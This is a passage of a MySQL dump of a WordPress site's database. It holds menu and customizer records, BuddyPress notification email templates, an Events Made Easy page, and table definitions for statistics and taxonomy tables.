-1864939159691585500,\n            \"_invalid\": false,\n            \"type_label\": \"Page\"\n        },\n        \"type\": \"nav_menu_item\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:08:49\"\n    },\n    \"nav_menu_item[-8050276982808113000]\": {\n        \"value\": {\n            \"object_id\": 0,\n            \"object\": \"\",\n            \"menu_item_parent\": 0,\n            \"position\": 1,\n            \"type\": \"custom\",\n            \"title\": \"Home\",\n            \"url\": \"http://localhost\",\n            \"target\": \"\",\n            \"attr_title\": \"\",\n            \"description\": \"\",\n            \"classes\": \"\",\n            \"xfn\": \"\",\n            \"status\": \"publish\",\n            \"original_title\": \"Home\",\n            \"nav_menu_term_id\": -1864939159691585500,\n            \"_invalid\": false,\n            \"type_label\": \"Custom Link\"\n        },\n        \"type\": \"nav_menu_item\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:08:49\"\n    }\n}', '', '', 'trash', 'closed', 'closed', '', '425893c3-0373-4e5f-8a98-f2abd04bef75', '', '', '2022-10-23 14:08:49', '2022-10-23 14:08:49', '', 0, 'http://localhost/2022/10/23/425893c3-0373-4e5f-8a98-f2abd04bef75/', 0, 'customize_changeset', '', 0),
(27, 1, '2022-10-23 14:08:49', '2022-10-23 14:08:49', ' ', '', '', 'publish', 'closed', 'closed', '', '27', '', '', '2022-10-23 14:08:49', '2022-10-23 14:08:49', '', 0, 'http://localhost/2022/10/23/27/', 2, 'nav_menu_item', '', 0),
(28, 1, '2022-10-23 14:08:49', '2022-10-23 14:08:49', '', 'Home', '', 'publish', 'closed', 'closed', '', 'home', '', '', '2022-10-23 14:08:49', '2022-10-23 14:08:49', '', 0, 'http://localhost/2022/10/23/home/', 1, 'nav_menu_item', '', 0),
(29, 1, '2022-10-23 14:09:32', '2022-10-23 14:09:32', '{\n    \"exs-dark::nav_menu_locations[topline]\": {\n        \"value\": 0,\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:09:32\"\n    },\n    \"exs-dark::nav_menu_locations[primary]\": {\n        \"value\": 4,\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:09:32\"\n    },\n    \"nav_menu_item[-9202957653733130000]\": {\n        \"value\": {\n            \"object_id\": 19,\n            \"object\": \"page\",\n            \"menu_item_parent\": 0,\n            \"position\": 3,\n            \"type\": \"post_type\",\n            \"title\": \"Cookie Policy (EU)\",\n            \"url\": \"http://localhost/cookie-policy-eu/\",\n            \"target\": \"\",\n            \"attr_title\": \"\",\n            \"description\": \"\",\n            \"classes\": \"\",\n            \"xfn\": \"\",\n            \"status\": \"publish\",\n            \"original_title\": \"Cookie Policy (EU)\",\n            \"nav_menu_term_id\": 4,\n            \"_invalid\": false,\n            \"type_label\": \"Legal Document\"\n        },\n        \"type\": \"nav_menu_item\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:09:32\"\n    },\n    \"nav_menu_item[-8401000203761426000]\": {\n        \"value\": false,\n        \"type\": \"nav_menu_item\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:09:32\"\n    }\n}', '', '', 'trash', 'closed', 'closed', '', 'fc31ee65-15fa-44e7-a88e-a745747bf750', '', '', '2022-10-23 14:09:32', '2022-10-23 14:09:32', '', 0, 'http://localhost/?p=29', 0, 'customize_changeset', '', 0),
(30, 1, '2022-10-23 14:09:32', '2022-10-23 14:09:32', ' ', '', '', 'publish', 'closed', 'closed', '', '30', '', '', '2022-10-23 14:09:32', '2022-10-23 14:09:32', '', 0, 'http://localhost/2022/10/23/30/', 3, 'nav_menu_item', '', 0),
(33, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 'Activity', '', 'publish', 'closed', 'closed', '', 'activity', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/activity/', 0, 'page', '', 0),
(34, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 'Members', '', 'publish', 'closed', 'closed', '', 'members', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/members/', 0, 'page', '', 0),
(35, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 'Register', '', 'publish', 'closed', 'closed', '', 'register', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/register/', 0, 'page', '', 0),
(36, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 'Activate', '', 'publish', 'closed', 'closed', '', 'activate', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/activate/', 0, 'page', '', 0),
(37, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Welcome to {{site.name}}!\n\nVisit your <a href=\"{{{profile.url}}}\">profile</a>, where you can tell us more about yourself, change your preferences, or make new connections, to get started.\n\nForgot your password? Don\'t worry, you can reset it with your email address from <a href=\"{{{lostpassword.url}}}\">this page</a> of our site', '[{{{site.name}}}] Welcome!', 'Welcome to {{site.name}}!\n\nVisit your profile, where you can tell us more about yourself, change your preferences, or make new connections, to get started: {{{profile.url}}}\n\nForgot your password? Don\'t worry, you can reset it with your email address from this page of our site: {{{lostpassword.url}}}', 'publish', 'closed', 'closed', '', 'site-name-welcome', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=37', 0, 'bp-email', '', 0),
(38, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{poster.name}} replied to one of your updates:\n\n<blockquote>&quot;{{usermessage}}&quot;</blockquote>\n\n<a href=\"{{{thread.url}}}\">Go to the discussion</a> to reply or catch up on the conversation.', '[{{{site.name}}}] {{poster.name}} replied to one of your updates', '{{poster.name}} replied to one of your updates:\n\n\"{{usermessage}}\"\n\nGo to the discussion to reply or catch up on the conversation: {{{thread.url}}}', 'publish', 'closed', 'closed', '', 'site-name-poster-name-replied-to-one-of-your-updates', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=38', 0, 'bp-email', '', 0),
(39, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{poster.name}} replied to one of your comments:\n\n<blockquote>&quot;{{usermessage}}&quot;</blockquote>\n\n<a href=\"{{{thread.url}}}\">Go to the discussion</a> to reply or catch up on the conversation.', '[{{{site.name}}}] {{poster.name}} replied to one of your comments', '{{poster.name}} replied to one of your comments:\n\n\"{{usermessage}}\"\n\nGo to the discussion to reply or catch up on the conversation: {{{thread.url}}}', 'publish', 'closed', 'closed', '', 'site-name-poster-name-replied-to-one-of-your-comments', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=39', 0, 'bp-email', '', 0),
(40, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{poster.name}} mentioned you in a status update:\n\n<blockquote>&quot;{{usermessage}}&quot;</blockquote>\n\n<a href=\"{{{mentioned.url}}}\">Go to the discussion</a> to reply or catch up on the conversation.', '[{{{site.name}}}] {{poster.name}} mentioned you in a status update', '{{poster.name}} mentioned you in a status update:\n\n\"{{usermessage}}\"\n\nGo to the discussion to reply or catch up on the conversation: {{{mentioned.url}}}', 'publish', 'closed', 'closed', '', 'site-name-poster-name-mentioned-you-in-a-status-update', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=40', 0, 'bp-email', '', 0),
(41, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{poster.name}} mentioned you in the group \"{{group.name}}\":\n\n<blockquote>&quot;{{usermessage}}&quot;</blockquote>\n\n<a href=\"{{{mentioned.url}}}\">Go to the discussion</a> to reply or catch up on the conversation.', '[{{{site.name}}}] {{poster.name}} mentioned you in an update', '{{poster.name}} mentioned you in the group \"{{group.name}}\":\n\n\"{{usermessage}}\"\n\nGo to the discussion to reply or catch up on the conversation: {{{mentioned.url}}}', 'publish', 'closed', 'closed', '', 'site-name-poster-name-mentioned-you-in-an-update', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=41', 0, 'bp-email', '', 0),
(42, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Thanks for registering!\n\nTo complete the activation of your account, go to the following link and click on the <strong>Activate</strong> button:\n<a href=\"{{{activate.url}}}\">{{{activate.url}}}</a>\n\nIf the \'Activation Key\' field is empty, copy and paste the following into the field - {{key}}', '[{{{site.name}}}] Activate your account', 'Thanks for registering!\n\nTo complete the activation of your account, go to the following link and click on the \'Activate\' button: {{{activate.url}}}\n\nIf the \'Activation Key\' field is empty, copy and paste the following into the field - {{key}}', 'publish', 'closed', 'closed', '', 'site-name-activate-your-account', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=42', 0, 'bp-email', '', 0),
(43, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '<a href=\"{{{initiator.url}}}\">{{initiator.name}}</a> wants to add you as a friend.\n\nTo accept this request and manage all of your pending requests, visit: <a href=\"{{{friend-requests.url}}}\">{{{friend-requests.url}}}</a>', '[{{{site.name}}}] New friendship request from {{initiator.name}}', '{{initiator.name}} wants to add you as a friend.\n\nTo accept this request and manage all of your pending requests, visit: {{{friend-requests.url}}}\n\nTo view {{initiator.name}}\'s profile, visit: {{{initiator.url}}}', 'publish', 'closed', 'closed', '', 'site-name-new-friendship-request-from-initiator-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=43', 0, 'bp-email', '', 0),
(44, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '<a href=\"{{{friendship.url}}}\">{{friend.name}}</a> accepted your friend request.', '[{{{site.name}}}] {{friend.name}} accepted your friendship request', '{{friend.name}} accepted your friend request.\n\nTo learn more about them, visit their profile: {{{friendship.url}}}', 'publish', 'closed', 'closed', '', 'site-name-friend-name-accepted-your-friendship-request', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=44', 0, 'bp-email', '', 0),
(45, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Group details for the group &quot;<a href=\"{{{group.url}}}\">{{group.name}}</a>&quot; were updated:\n<blockquote>{{changed_text}}</blockquote>', '[{{{site.name}}}] Group details updated', 'Group details for the group \"{{group.name}}\" were updated:\n\n{{changed_text}}\n\nTo view the group, visit: {{{group.url}}}', 'publish', 'closed', 'closed', '', 'site-name-group-details-updated', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=45', 0, 'bp-email', '', 0),
(46, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '<a href=\"{{{inviter.url}}}\">{{inviter.name}}</a> has invited you to join the group: &quot;{{group.name}}&quot;.\n\n{{invite.message}}\n\n<a href=\"{{{invites.url}}}\">Go here to accept your invitation</a> or <a href=\"{{{group.url}}}\">visit the group</a> to learn more.', '[{{{site.name}}}] You have an invitation to the group: \"{{group.name}}\"', '{{inviter.name}} has invited you to join the group: \"{{group.name}}\".\n\n{{invite.message}}\n\nTo accept your invitation, visit: {{{invites.url}}}\n\nTo learn more about the group, visit: {{{group.url}}}.\nTo view {{inviter.name}}\'s profile, visit: {{{inviter.url}}}', 'publish', 'closed', 'closed', '', 'site-name-you-have-an-invitation-to-the-group-group-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=46', 0, 'bp-email', '', 0),
(47, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'You have been promoted to <b>{{promoted_to}}</b> in the group &quot;<a href=\"{{{group.url}}}\">{{group.name}}</a>&quot;.', '[{{{site.name}}}] You have been promoted in the group: \"{{group.name}}\"', 'You have been promoted to {{promoted_to}} in the group: \"{{group.name}}\".\n\nTo visit the group, go to: {{{group.url}}}', 'publish', 'closed', 'closed', '', 'site-name-you-have-been-promoted-in-the-group-group-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=47', 0, 'bp-email', '', 0),
(48, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '<a href=\"{{{profile.url}}}\">{{requesting-user.name}}</a> wants to join the group &quot;{{group.name}}&quot;.\n {{request.message}}\n As you are an administrator of this group, you must either accept or reject the membership request.\n\n<a href=\"{{{group-requests.url}}}\">Go here to manage this</a> and all other pending requests.', '[{{{site.name}}}] Membership request for group: {{group.name}}', '{{requesting-user.name}} wants to join the group \"{{group.name}}\". As you are the administrator of this group, you must either accept or reject the membership request.\n\nTo manage this and all other pending requests, visit: {{{group-requests.url}}}\n\nTo view {{requesting-user.name}}\'s profile, visit: {{{profile.url}}}', 'publish', 'closed', 'closed', '', 'site-name-membership-request-for-group-group-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=48', 0, 'bp-email', '', 0),
(49, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{sender.name}} sent you a new message: &quot;{{usersubject}}&quot;\n\n<blockquote>&quot;{{usermessage}}&quot;</blockquote>\n\n<a href=\"{{{message.url}}}\">Go to the discussion</a> to reply or catch up on the conversation.', '[{{{site.name}}}] New message from {{sender.name}}', '{{sender.name}} sent you a new message: \"{{usersubject}}\"\n\n\"{{usermessage}}\"\n\nGo to the discussion to reply or catch up on the conversation: {{{message.url}}}', 'publish', 'closed', 'closed', '', 'site-name-new-message-from-sender-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=49', 0, 'bp-email', '', 0),
(50, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'You recently changed the email address associated with your account on {{site.name}} to {{user.email}}. If this is correct, <a href=\"{{{verify.url}}}\">go here to confirm the change</a>.\n\nOtherwise, you can safely ignore and delete this email if you have changed your mind, or if you think you have received this email in error.', '[{{{site.name}}}] Verify your new email address', 'You recently changed the email address associated with your account on {{site.name}} to {{user.email}}. If this is correct, go to the following link to confirm the change: {{{verify.url}}}\n\nOtherwise, you can safely ignore and delete this email if you have changed your mind, or if you think you have received this email in error.', 'publish', 'closed', 'closed', '', 'site-name-verify-your-new-email-address', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=50', 0, 'bp-email', '', 0),
(51, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Your membership request for the group &quot;<a href=\"{{{group.url}}}\">{{group.name}}</a>&quot; has been accepted.', '[{{{site.name}}}] Membership request for group \"{{group.name}}\" accepted', 'Your membership request for the group \"{{group.name}}\" has been accepted.\n\nTo view the group, visit: {{{group.url}}}', 'publish', 'closed', 'closed', '', 'site-name-membership-request-for-group-group-name-accepted', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=51', 0, 'bp-email', '', 0),
(52, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Your membership request for the group &quot;<a href=\"{{{group.url}}}\">{{group.name}}</a>&quot; has been rejected.', '[{{{site.name}}}] Membership request for group \"{{group.name}}\" rejected', 'Your membership request for the group \"{{group.name}}\" has been rejected.\n\nTo request membership again, visit: {{{group.url}}}', 'publish', 'closed', 'closed', '', 'site-name-membership-request-for-group-group-name-rejected', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=52', 0, 'bp-email', '', 0),
(53, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '<a href=\"{{{inviter.url}}}\">{{inviter.name}}</a> has invited you to join the site: &quot;{{site.name}}&quot;.\n\n{{usermessage}}\n\n<a href=\"{{{invite.accept_url}}}\">Accept your invitation</a> or <a href=\"{{{site.url}}}\">visit the site</a> to learn more.', '{{inviter.name}} has invited you to join {{site.name}}', '{{inviter.name}} has invited you to join the site \"{{site.name}}\".\n\n{{usermessage}}\n\nTo accept your invitation, visit: {{{invite.accept_url}}}\n\nTo learn more about the site, visit: {{{site.url}}}.\nTo view {{inviter.name}}\'s profile, visit: {{{inviter.url}}}', 'publish', 'closed', 'closed', '', 'inviter-name-has-invited-you-to-join-site-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=53', 0, 'bp-email', '', 0),
(54, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', '{{requesting-user.user_login}} would like to join the site: &quot;{{site.name}}&quot;.\n\n<a href=\"{{{manage.url}}}\">Manage the request</a>.', '{{requesting-user.user_login}} would like to join {{site.name}}', '{{requesting-user.user_login}} would like to join the site \"{{site.name}}\".\n\nTo manage the request, visit: {{{manage.url}}}.', 'publish', 'closed', 'closed', '', 'requesting-user-user_login-would-like-to-join-site-name', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=54', 0, 'bp-email', '', 0),
(55, 1, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 'Sorry, your request to join the site &quot;{{site.name}}&quot; has been declined.', 'Your request to join {{site.name}} has been declined', 'Sorry, your request to join the site \"{{site.name}}\" has been declined.', 'publish', 'closed', 'closed', '', 'your-request-to-join-site-name-has-been-declined', '', '', '2022-10-23 15:44:16', '2022-10-23 15:44:16', '', 0, 'http://exp-2-2/?post_type=bp-email&p=55', 0, 'bp-email', '', 0),
(57, 1, '2022-10-23 15:48:02', '2022-10-23 15:48:02', 'This page is used by Events Made Easy. Don\'t change it, don\'t use it in your menu\'s, don\'t delete it. Just make sure the EME setting called \'Events page\' points to this page. EME uses this page to render any and all events, locations, bookings, maps, ... anything. If you do want to delete this page, create a new one EME can use and update the EME setting \'Events page\' accordingly.', 'Events', '', 'trash', 'closed', 'closed', '', 'events__trashed', '', '', '2022-10-23 16:13:00', '2022-10-23 16:13:00', '', 0, 'http://exp-2-2/events/', 0, 'page', '', 0),
(58, 1, '2022-10-23 16:13:00', '2022-10-23 16:13:00', 'This page is used by Events Made Easy. Don\'t change it, don\'t use it in your menu\'s, don\'t delete it. Just make sure the EME setting called \'Events page\' points to this page. EME uses this page to render any and all events, locations, bookings, maps, ... anything. If you do want to delete this page, create a new one EME can use and update the EME setting \'Events page\' accordingly.', 'Events', '', 'inherit', 'closed', 'closed', '', '57-revision-v1', '', '', '2022-10-23 16:13:00', '2022-10-23 16:13:00', '', 57, 'http://exp-2-2/?p=58', 0, 'revision', '', 0),
(60, 1, '2022-10-23 16:13:23', '2022-10-23 16:13:23', 'This page is used by Events Made Easy. Don\'t change it, don\'t use it in your menu\'s, don\'t delete it. Just make sure the EME setting called \'Events page\' points to this page. EME uses this page to render any and all events, locations, bookings, maps, ... anything. If you do want to delete this page, create a new one EME can use and update the EME setting \'Events page\' accordingly.', 'Events', '', 'publish', 'closed', 'closed', '', 'events', '', '', '2022-10-23 16:13:23', '2022-10-23 16:13:23', '', 0, 'http://exp-2-2/events/', 0, 'page', '', 0),
(61, 1, '2022-10-23 16:47:15', '0000-00-00 00:00:00', '', 'Auto Draft', '', 'auto-draft', 'open', 'open', '', '', '', '', '2022-10-23 16:47:15', '0000-00-00 00:00:00', '', 0, 'http://exp-2-2/?p=61', 0, 'post', '', 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_signups`
--

CREATE TABLE `wp_signups` (
  `signup_id` bigint(20) NOT NULL,
  `domain` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `path` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `title` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_login` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `activated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `active` tinyint(1) NOT NULL DEFAULT 0,
  `activation_key` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `meta` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_exclusions`
--

CREATE TABLE `wp_statistics_exclusions` (
  `ID` bigint(20) NOT NULL,
  `date` date NOT NULL,
  `reason` varchar(180) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `count` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_historical`
--

CREATE TABLE `wp_statistics_historical` (
  `ID` bigint(20) NOT NULL,
  `category` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL,
  `page_id` bigint(20) NOT NULL,
  `uri` varchar(190) COLLATE utf8mb4_unicode_ci NOT NULL,
  `value` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_pages`
--

CREATE TABLE `wp_statistics_pages` (
  `page_id` bigint(20) NOT NULL,
  `uri` varchar(190) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` varchar(180) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `count` int(11) NOT NULL,
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_search`
--

CREATE TABLE `wp_statistics_search` (
  `ID` bigint(20) NOT NULL,
  `last_counter` date NOT NULL,
  `engine` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `host` varchar(190) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `words` varchar(190) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `visitor` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_useronline`
--

CREATE TABLE `wp_statistics_useronline` (
  `ID` bigint(20) NOT NULL,
  `ip` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created` int(11) DEFAULT NULL,
  `timestamp` int(10) NOT NULL,
  `date` datetime NOT NULL,
  `referred` text CHARACTER SET utf8mb3 NOT NULL,
  `agent` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `platform` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `version` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` bigint(48) NOT NULL,
  `page_id` bigint(48) NOT NULL,
  `type` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_visit`
--

CREATE TABLE `wp_statistics_visit` (
  `ID` bigint(20) NOT NULL,
  `last_visit` datetime NOT NULL,
  `last_counter` date NOT NULL,
  `visit` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_visitor`
--

CREATE TABLE `wp_statistics_visitor` (
  `ID` bigint(20) NOT NULL,
  `last_counter` date NOT NULL,
  `referred` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `agent` varchar(180) COLLATE utf8mb4_unicode_ci NOT NULL,
  `platform` varchar(180) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `version` varchar(180) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `UAString` varchar(190) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ip` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` bigint(40) NOT NULL,
  `hits` int(11) DEFAULT NULL,
  `honeypot` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_statistics_visitor_relationships`
--

CREATE TABLE `wp_statistics_visitor_relationships` (
  `ID` bigint(20) NOT NULL,
  `visitor_id` bigint(20) NOT NULL,
  `page_id` bigint(20) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_termmeta`
--

CREATE TABLE `wp_termmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `term_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_terms`
--

CREATE TABLE `wp_terms` (
  `term_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `slug` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `term_group` bigint(10) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_terms`
--

INSERT INTO `wp_terms` (`term_id`, `name`, `slug`, `term_group`) VALUES
(1, 'Uncategorized', 'uncategorized', 0),
(2, 'exs-dark', 'exs-dark', 0),
(3, 'Mad Haxx', 'mad-haxx', 0),
(4, 'Custom Menu', 'custom-menu', 0),
(5, 'core-user-activation', 'core-user-activation', 0),
(6, 'activity-comment', 'activity-comment', 0),
(7, 'activity-comment-author', 'activity-comment-author', 0),
(8, 'activity-at-message', 'activity-at-message', 0),
(9, 'groups-at-message', 'groups-at-message', 0),
(10, 'core-user-registration', 'core-user-registration', 0),
(11, 'friends-request', 'friends-request', 0),
(12, 'friends-request-accepted', 'friends-request-accepted', 0),
(13, 'groups-details-updated', 'groups-details-updated', 0),
(14, 'groups-invitation', 'groups-invitation', 0),
(15, 'groups-member-promoted', 'groups-member-promoted', 0),
(16, 'groups-membership-request', 'groups-membership-request', 0),
(17, 'messages-unread', 'messages-unread', 0),
(18, 'settings-verify-email-change', 'settings-verify-email-change', 0),
(19, 'groups-membership-request-accepted', 'groups-membership-request-accepted', 0),
(20, 'groups-membership-request-rejected', 'groups-membership-request-rejected', 0),
(21, 'bp-members-invitation', 'bp-members-invitation', 0),
(22, 'members-membership-request', 'members-membership-request', 0),
(23, 'members-membership-request-rejected', 'members-membership-request-rejected', 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_term_relationships`
--

CREATE TABLE `wp_term_relationships` (
  `object_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `term_order` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_term_relationships`
--

INSERT INTO `wp_term_relationships` (`object_id`, `term_taxonomy_id`, `term_order`) VALUES
(1, 1, 0),
(7, 3, 0),
(8, 2, 0),
(10, 3, 0),
(12, 3, 0),
(14, 3, 0),
(27, 4, 0),
(28, 4, 0),
(30, 4, 0),
(37, 5, 0),
(38, 6, 0),
(39, 7, 0),
(40, 8, 0),
(41, 9, 0),
(42, 10, 0),
(43, 11, 0),
(44, 12, 0),
(45, 13, 0),
(46, 14, 0),
(47, 15, 0),
(48, 16, 0),
(49, 17, 0),
(50, 18, 0),
(51, 19, 0),
(52, 20, 0),
(53, 21, 0),
(54, 22, 0),
(55, 23, 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_term_taxonomy`
--

CREATE TABLE `wp_term_taxonomy` (
  `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL,
  `term_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `taxonomy` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `description` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `parent` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `count` bigint(20) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_term_taxonomy`
--

INSERT INTO `wp_term_taxonomy` (`term_taxonomy_id`, `term_id`, `taxonomy`, `description`, `parent`, `count`) VALUES
(1, 1, 'category', '', 0, 0),
(2, 2, 'wp_theme', '', 0, 1),
(3, 3, 'category', '', 0, 4),
(4, 4, 'nav_menu', '', 0, 3),
(5, 5, 'bp-email-type', 'Recipient has successfully activated an account.', 0, 1),
